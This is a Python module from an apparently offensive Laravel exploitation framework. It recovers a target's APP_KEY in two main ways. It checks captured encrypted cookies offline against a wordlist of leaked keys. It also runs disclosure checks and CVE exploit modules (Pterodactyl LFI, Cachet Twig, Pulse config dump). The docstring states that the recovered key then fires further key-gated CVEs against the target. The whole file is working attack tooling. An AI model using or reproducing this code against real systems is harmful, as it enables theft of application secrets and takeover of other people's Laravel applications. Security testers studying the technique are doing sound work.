#!/usr/bin/env python3
"""APP_KEY recovery helpers shared by the standard scan/exploit workflow.

A Laravel encrypted cookie / X-XSRF-TOKEN is a base64 of JSON {"iv","value","mac"} where
    mac == HMAC_SHA256( decoded_app_key_bytes , b64_iv + b64_value ).hexdigest()
This is the exact integrity check Laravel's Encrypter::decrypt() runs BEFORE it ever decrypts, so it is
a CRYPTOGRAPHICALLY ZERO-FALSE-POSITIVE oracle: a wrong key cannot forge a matching SHA-256 MAC. We try
each known/leaked/default APP_KEY from the vendored wordlist against an ALREADY-CAPTURED cookie envelope
(the probe already fetched it) — so key recovery is OFFLINE and adds ZERO HTTP requests.

On a hit, check.py feeds the recovered key into loot["app_key"], firing the app_key-gated consumer CVEs
(CVE-2018-15133 / 2024-48987 / 2024-55555 / 2024-55556) on any target that REUSES a public/default/leaked
key. A freshly `php artisan key:generate`'d app is in no wordlist and is therefore immune — this expands
attack surface to the key-reuse population only, it does not "exploit everything".

Wordlist provenance: modules/probes/data/appkey_wordlist.txt — 1140 unique valid base64 AES keys deduped
from laravel-crypto-killer (MIT, (c) 2024 Synacktiv). Vendored so this module has NO external dependency.

The higher-level recover_app_key() routine keeps all standard APP_KEY producers in one place:
  1. offline cookie-HMAC against the vendored key list,
  2. direct read-only disclosure checks (.env, CVE-2017-16894, app-root disclosure),
  3. optional CVE producer methods that disclose config/APP_KEY without requiring a prior APP_KEY.
"""
import base64
import hashlib
import hmac
import importlib
import inspect
import json
import os
import re
from urllib.parse import unquote

from modules.core import http_config
from modules.core.http_config import normalize_base
from modules.cves import module_path_for

_WORDLIST = os.path.join(os.path.dirname(__file__), "data", "appkey_wordlist.txt")
_KEYS_CACHE = None

STANDARD_DISCLOSURE_PRODUCERS = (
    ("env", "modules.detection.env_exposure", "env_exposure", {"laravel_info": True}),
    ("cve_2017_16894", "modules.cves.cve_2017_16894", "laravel_env_cve", {}),
    ("app_root_disclosure", "modules.detection.app_root_disclosure", "app_root_disclosure", {"laravel_info": True}),
)

CVE_CONFIG_PRODUCERS = (
    ("CVE-2025-49132", "pterodactyl_locale_config_lfi"),
    ("CVE-2023-43661", "cachet_twig_config_app_key"),
    ("CVE-2024-55661", "pulse_livewire_config_dump"),
)

COOKIE_ROLE_ALIASES = {
    "xsrf": {
        "canonical_cookie": "XSRF-TOKEN",
        "canonical_header": "X-XSRF-TOKEN",
        "exact": {"xsrf_token", "x_xsrf_token"},
        "suffixes": ("_xsrf_token", "_csrf_token"),
    },
    "session": {
        "canonical_cookie": "laravel_session",
        "exact": {"laravel_session"},
        "suffixes": ("_session",),
    },
}


def _normalize_cookie_name(name):
    return re.sub(r"[^a-z0-9]+", "_", str(name or "").lower()).strip("_")


def classify_laravel_cookie(name, value=None):
    """Classify Laravel cookie-name variants and encrypted-envelope evidence.

    Laravel commonly renames the session cookie to `<app>_session`; some stacks also expose
    XSRF/CSRF cookie names with underscores, prefixes, or the header-like X-XSRF-TOKEN spelling.
    The value shape is still authoritative for APP_KEY recovery: any encrypted Laravel envelope is
    usable for the HMAC oracle even if the name is custom.
    """
    raw_name = str(name or "")
    norm = _normalize_cookie_name(raw_name)
    envelope = parse_cookie_envelope(value) is not None if value is not None else False

    role = None
    canonical = None
    header = None
    for candidate, spec in COOKIE_ROLE_ALIASES.items():
        if norm in spec.get("exact", set()) or any(norm.endswith(suf) for suf in spec.get("suffixes", ())):
            role = candidate
            canonical = spec["canonical_cookie"]
            header = spec.get("canonical_header")
            break

    if role is None and envelope:
        role = "encrypted_envelope"
        canonical = "Laravel encrypted cookie"

    if role is None:
        return None

    exact_names = {
        _normalize_cookie_name(COOKIE_ROLE_ALIASES["xsrf"]["canonical_cookie"]),
        _normalize_cookie_name(COOKIE_ROLE_ALIASES["xsrf"]["canonical_header"]),
        _normalize_cookie_name(COOKIE_ROLE_ALIASES["session"]["canonical_cookie"]),
    }
    is_variation = norm not in exact_names
    info = {
        "name": raw_name,
        "normalized_name": norm,
        "role": role,
        "canonical_cookie": canonical,
        "is_variation": is_variation,
        "encrypted_envelope": envelope,
    }
    if header:
        info["canonical_header"] = header
    if is_variation and canonical:
        info["variation_of"] = canonical
    return info


def describe_cookie_variation(info):
    if not info:
        return "unknown cookie"
    name = info.get("name") or "?"
    canonical = info.get("canonical_cookie") or "Laravel cookie"
    role = info.get("role") or "cookie"
    if info.get("is_variation"):
        return f"{name} ({role} alias for {canonical})"
    return f"{name} ({role})"


def _decode_key(key_b64):
    """'base64:XXXX' -> raw AES key bytes; None for a malformed/non-key line."""
    try:
        raw = base64.b64decode(key_b64[7:], validate=False) if key_b64.startswith("base64:") else key_b64.encode()
    except Exception:
        return None
    return raw if len(raw) in (16, 24, 32) else None


def load_wordlist_keys(path=_WORDLIST):
    """Cached list of valid base64 AES APP_KEYs from the vendored wordlist (skips comments/junk)."""
    global _KEYS_CACHE
    if _KEYS_CACHE is not None and path == _WORDLIST:
        return _KEYS_CACHE
    keys = []
    try:
        with open(path, errors="replace") as fh:
            for line in fh:
                k = line.strip()
                if k and not k.startswith("#") and _decode_key(k) is not None:
                    keys.append(k)
    except OSError:
        keys = []
    keys = list(dict.fromkeys(keys))  # dedup, preserve order
    if path == _WORDLIST:
        _KEYS_CACHE = keys
    return keys


def parse_cookie_envelope(cookie_value):
    """A Laravel cookie value -> {'iv','value','mac'} dict, or None if it is not an encrypted envelope.
    Handles URL-encoding (cookies are often %-encoded). Plain session ids (e.g. laravel_session value)
    are not base64-JSON envelopes and return None."""
    if not cookie_value or not isinstance(cookie_value, str):
        return None
    try:
        data = json.loads(base64.b64decode(unquote(cookie_value)))
    except Exception:
        return None
    if isinstance(data, dict) and {"iv", "value", "mac"} <= set(data):
        return {"iv": data["iv"], "value": data["value"], "mac": data["mac"]}
    return None


def hmac_matches(key_b64, iv_b64, value_b64, mac_hex):
    """True iff key_b64 is the APP_KEY that produced this envelope's MAC (zero-FP, offline, no decrypt)."""
    kb = _decode_key(key_b64)
    if kb is None:
        return False
    calc = hmac.new(kb, (iv_b64 + value_b64).encode("ascii"), hashlib.sha256).hexdigest()
    return hmac.compare_digest(calc, mac_hex)


def recover_from_envelope(iv_b64, value_b64, mac_hex, keys=None):
    """Brute-force the vendored wordlist against one envelope. Returns the matching base64 key, or None.
    Pure CPU, no network."""
    for k in (keys if keys is not None else load_wordlist_keys()):
        if hmac_matches(k, iv_b64, value_b64, mac_hex):
            return k
    return None


def recover_from_cookies(cookies, keys=None):
    """Given the probe's captured cookies (list of {'name','value',...} as detect_laravel records them),
    try to recover the APP_KEY offline from any encrypted-envelope cookie. Cookie names can be the
    defaults (XSRF-TOKEN / laravel_session) or aliases such as <app>_session; the value shape is what
    matters for recovery. Returns {'app_key','source_cookie','source':'wordlist-hmac', ...} or None.
    ZERO HTTP requests — operates only on already-captured data."""
    if not cookies:
        return None
    klist = keys if keys is not None else load_wordlist_keys()
    for c in cookies:
        name = c.get("name") if isinstance(c, dict) else "?"
        val = c.get("value") if isinstance(c, dict) else None
        env = parse_cookie_envelope(val)
        if not env:
            continue
        hit = recover_from_envelope(env["iv"], env["value"], env["mac"], klist)
        if hit:
            variation = classify_laravel_cookie(name, val) or {
                "name": name or "?",
                "role": "encrypted_envelope",
                "canonical_cookie": "Laravel encrypted cookie",
                "is_variation": True,
                "encrypted_envelope": True,
            }
            return {
                "app_key": hit,
                "source_cookie": name or "?",
                "source": "wordlist-hmac",
                "cookie_role": variation.get("role"),
                "cookie_variation": variation,
            }
    return None


def app_key_from_result(result):
    """Return the APP_KEY artifact emitted by a producer result, if present."""
    artifacts = (result or {}).get("artifacts") or {}
    return artifacts.get("app_key") or artifacts.get("leaked_app_key")


def cookies_from_detection(det):
    """Extract raw cookie name/value pairs from a detection result's artifacts.

    Cookie-deserialization detectors often stash raw Set-Cookie material under
    artifacts.session_driver_probe.responses[].set_cookie. This parser is deliberately
    small and read-only so it can feed the offline HMAC oracle without doing any new HTTP.
    """
    out = []
    arts = (det or {}).get("artifacts") or {}
    probe = arts.get("session_driver_probe")
    if isinstance(probe, str):
        try:
            import ast as _ast
            probe = _ast.literal_eval(probe)
        except Exception:
            probe = None
    set_cookie_strs = []
    if isinstance(probe, dict):
        for resp in probe.get("responses") or []:
            sc = resp.get("set_cookie") if isinstance(resp, dict) else None
            if sc:
                set_cookie_strs.append(sc)
    for c in arts.get("cookies") or []:
        if isinstance(c, dict) and c.get("name"):
            out.append({"name": c["name"], "value": c.get("value")})
    for sc in set_cookie_strs:
        head = str(sc).split(";", 1)[0].strip()
        if "=" in head:
            name, _, value = head.partition("=")
            if name and value:
                out.append({"name": name.strip(), "value": value.strip()})
    return out


def _accepted_kwargs(fn, candidate: dict) -> dict:
    try:
        sig = inspect.signature(fn)
    except (TypeError, ValueError):
        return {}
    params = sig.parameters
    if any(p.kind == inspect.Parameter.VAR_KEYWORD for p in params.values()):
        return {k: v for k, v in candidate.items() if v is not None}
    return {k: v for k, v in candidate.items() if k in params and v is not None}


def _record(source, method, app_key, *, detail=None, artifacts=None, attempts=None):
    if not app_key:
        return None
    return {
        "app_key": app_key,
        "source": source,
        "method": method,
        "detail": detail,
        "artifacts": artifacts or {},
        "attempts": attempts or [],
    }


def _try_cookie_set(cookies, where, keys, attempts):
    if not cookies:
        attempts.append({"method": "wordlist-hmac", "where": where, "status": "skipped", "reason": "no cookies"})
        return None
    try:
        recovered = recover_from_cookies(cookies, keys=keys)
    except Exception as exc:
        attempts.append({
            "method": "wordlist-hmac",
            "where": where,
            "status": "error",
            "error": f"{type(exc).__name__}: {exc}",
        })
        return None
    if recovered and recovered.get("app_key"):
        source_cookie = recovered.get("source_cookie", "?")
        variation = recovered.get("cookie_variation") or classify_laravel_cookie(source_cookie)
        cookie_detail = describe_cookie_variation(variation)
        attempts.append({
            "method": "wordlist-hmac",
            "where": where,
            "status": "recovered",
            "source_cookie": source_cookie,
            "cookie_variation": variation,
        })
        return _record(
            "wordlist-hmac",
            "offline_cookie_hmac",
            recovered["app_key"],
            detail=f"{cookie_detail} via appkey_wordlist.txt ({where})",
            artifacts={"cookie_variation": variation} if variation else {},
            attempts=attempts,
        )
    attempts.append({"method": "wordlist-hmac", "where": where, "status": "miss"})
    return None


def _run_scan_producer(target_url, source, module_name, method, *, laravel_info, session, active_module, attempts):
    extra_spec = next((extra for s, m, _, extra in STANDARD_DISCLOSURE_PRODUCERS
                       if s == source and m == module_name), {})
    try:
        scan_fn = getattr(importlib.import_module(module_name), "scan")
        candidate = {"session": session}
        if extra_spec.get("laravel_info"):
            candidate["laravel_info"] = laravel_info
        http_config.set_active_module(source)
        finding = scan_fn(target_url, **_accepted_kwargs(scan_fn, candidate))
    except Exception as exc:
        attempts.append({
            "method": method,
            "source": source,
            "status": "error",
            "error": f"{type(exc).__name__}: {exc}",
        })
        return None
    finally:
        http_config.set_active_module(active_module)

    app_key = app_key_from_result(finding)
    if app_key:
        attempts.append({"method": method, "source": source, "status": "recovered"})
        return _record(source, method, app_key, attempts=attempts, artifacts=(finding or {}).get("artifacts"))
    attempts.append({"method": method, "source": source, "status": "miss"})
    return None


def _recover_pterodactyl_config(target_url, *, session, active_module, attempts):
    try:
        mod = importlib.import_module(module_path_for("CVE-2025-49132"))
        sess = session or http_config.get_auth_session()
        base = normalize_base(target_url)
        http_config.set_active_module("CVE-2025-49132")
        secrets, app_key = mod._collect_secrets(sess, base)
    except Exception as exc:
        attempts.append({
            "method": "pterodactyl_locale_config_lfi",
            "source": "CVE-2025-49132",
            "status": "error",
            "error": f"{type(exc).__name__}: {exc}",
        })
        return None
    finally:
        http_config.set_active_module(active_module)

    if app_key:
        attempts.append({
            "method": "pterodactyl_locale_config_lfi",
            "source": "CVE-2025-49132",
            "status": "recovered",
        })
        return _record(
            "CVE-2025-49132",
            "pterodactyl_locale_config_lfi",
            app_key,
            detail="config/app disclosure via /locales/locale.json traversal",
            artifacts={"secrets": secrets or {}},
            attempts=attempts,
        )
    attempts.append({"method": "pterodactyl_locale_config_lfi", "source": "CVE-2025-49132", "status": "miss"})
    return None


def _recover_cachet_twig(target_url, *, session, username, password, options, active_module, attempts):
    opts = dict(options or {})
    if not (opts.get("token") or (username and password)):
        attempts.append({
            "method": "cachet_twig_config_app_key",
            "source": "CVE-2023-43661",
            "status": "skipped",
            "reason": "requires Cachet API token or username/password",
        })
        return None
    opts["secrets_only"] = True
    opts["no_rce"] = True
    try:
        exploit_fn = getattr(importlib.import_module(module_path_for("CVE-2023-43661")), "exploit")
        http_config.set_active_module("CVE-2023-43661")
        result = exploit_fn(
            target_url,
            username=username,
            password=password,
            options=opts,
            session=session,
        )
    except Exception as exc:
        attempts.append({
            "method": "cachet_twig_config_app_key",
            "source": "CVE-2023-43661",
            "status": "error",
            "error": f"{type(exc).__name__}: {exc}",
        })
        return None
    finally:
        http_config.set_active_module(active_module)

    app_key = app_key_from_result(result)
    if app_key:
        attempts.append({"method": "cachet_twig_config_app_key", "source": "CVE-2023-43661", "status": "recovered"})
        return _record(
            "CVE-2023-43661",
            "cachet_twig_config_app_key",
            app_key,
            detail="Cachet incident-template Twig render disclosed config('app.key')",
            artifacts=(result or {}).get("artifacts"),
            attempts=attempts,
        )
    attempts.append({"method": "cachet_twig_config_app_key", "source": "CVE-2023-43661", "status": "miss"})
    return None


def _recover_pulse_config(target_url, *, session, username, password, options, active_module, attempts):
    opts = dict(options or {})
    if not (session or (username and password)):
        attempts.append({
            "method": "pulse_livewire_config_dump",
            "source": "CVE-2024-55661",
            "status": "skipped",
            "reason": "requires authenticated Pulse dashboard session or credentials",
        })
        return None
    opts["secrets_only"] = True
    opts["no_rce"] = True
    opts.setdefault("callable", "\\Illuminate\\Support\\Facades\\Config::all")
    try:
        exploit_fn = getattr(importlib.import_module(module_path_for("CVE-2024-55661")), "exploit")
        http_config.set_active_module("CVE-2024-55661")
        result = exploit_fn(
            target_url,
            username=username,
            password=password,
            options=opts,
            session=session,
        )
    except Exception as exc:
        attempts.append({
            "method": "pulse_livewire_config_dump",
            "source": "CVE-2024-55661",
            "status": "error",
            "error": f"{type(exc).__name__}: {exc}",
        })
        return None
    finally:
        http_config.set_active_module(active_module)

    app_key = app_key_from_result(result)
    if app_key:
        attempts.append({"method": "pulse_livewire_config_dump", "source": "CVE-2024-55661", "status": "recovered"})
        return _record(
            "CVE-2024-55661",
            "pulse_livewire_config_dump",
            app_key,
            detail="Pulse Livewire remember(Config::all) disclosed app config",
            artifacts=(result or {}).get("artifacts"),
            attempts=attempts,
        )
    attempts.append({"method": "pulse_livewire_config_dump", "source": "CVE-2024-55661", "status": "miss"})
    return None


def recover_app_key(
    target_url,
    *,
    laravel_info=None,
    session=None,
    detection=None,
    username=None,
    password=None,
    options=None,
    include_live_cookie=True,
    include_detection_producers=True,
    include_cve_methods=False,
    active_module=None,
):
    """Run the standard APP_KEY recovery workflow and return a recovery record or None.

    This function never falls back to lab-pinned keys. CVE producer methods are opt-in because
    Cachet/Pulse require authenticated exploit-path actions; callers should enable them only in
    exploit mode or other explicit recovery contexts.
    """
    attempts = []
    keys = load_wordlist_keys()

    cookies = list((laravel_info or {}).get("cookies") or [])
    cookies.extend(cookies_from_detection(detection))
    found = _try_cookie_set(cookies, "captured cookie", keys, attempts)
    if found:
        return found

    if include_live_cookie:
        try:
            resp = http_config.unauth_get(target_url, timeout=10)
            live = [{"name": n, "value": v} for n, v in (resp.cookies.get_dict() or {}).items()]
        except Exception:
            live = []
        found = _try_cookie_set(live, "live cookie fetch", keys, attempts)
        if found:
            return found

    if include_detection_producers:
        for source, module_name, method, _extra in STANDARD_DISCLOSURE_PRODUCERS:
            found = _run_scan_producer(
                target_url,
                source,
                module_name,
                method,
                laravel_info=laravel_info,
                session=session,
                active_module=active_module,
                attempts=attempts,
            )
            if found:
                return found

    if include_cve_methods:
        for cve, method in CVE_CONFIG_PRODUCERS:
            if cve == "CVE-2025-49132":
                found = _recover_pterodactyl_config(target_url, session=session, active_module=active_module, attempts=attempts)
            elif cve == "CVE-2023-43661":
                found = _recover_cachet_twig(
                    target_url,
                    session=session,
                    username=username,
                    password=password,
                    options=options,
                    active_module=active_module,
                    attempts=attempts,
                )
            elif cve == "CVE-2024-55661":
                found = _recover_pulse_config(
                    target_url,
                    session=session,
                    username=username,
                    password=password,
                    options=options,
                    active_module=active_module,
                    attempts=attempts,
                )
            else:
                found = None
            if found:
                return found

    return None
